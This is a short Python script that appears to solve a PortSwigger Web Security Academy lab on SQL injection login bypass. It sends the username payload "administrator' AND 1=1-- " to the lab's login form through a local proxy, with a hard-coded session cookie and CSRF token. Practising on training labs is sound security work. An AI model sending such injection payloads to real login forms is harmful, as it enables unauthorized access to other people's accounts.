# https://portswigger.net/web-security/sql-injection/lab-login-bypass

import requests
requests.packages.urllib3.disable_warnings()

url = "https://ac751fae1f2bbdda80188e3700ec00c3.web-security-academy.net/login"
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
cookies = {"session": "o6yJBTIIOOLFJ1ziJQt7Rktjw07qjGcu"}

u = "administrator' AND 1=1-- "
data = {"username": u, "password": "p", "csrf": "RhvgM0iM6q1mO7NKCMVTdbuaqMOEgcn1"}

requests.post(url, data=data, verify=verify, proxies=proxies, cookies=cookies)
